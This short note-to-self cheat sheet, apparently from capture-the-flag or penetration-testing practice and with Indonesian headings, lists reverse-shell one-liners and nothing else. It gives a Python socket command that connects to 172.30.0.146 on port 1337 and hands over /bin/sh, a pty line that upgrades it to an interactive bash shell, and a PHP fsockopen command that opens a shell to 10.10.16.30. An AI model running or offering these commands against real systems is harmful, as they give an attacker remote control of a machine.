# bakal shell python

get remote shell: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.0.146",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
get proper shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

# bakal shell php

php -r '$sock=fsockopen("10.10.16.30",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
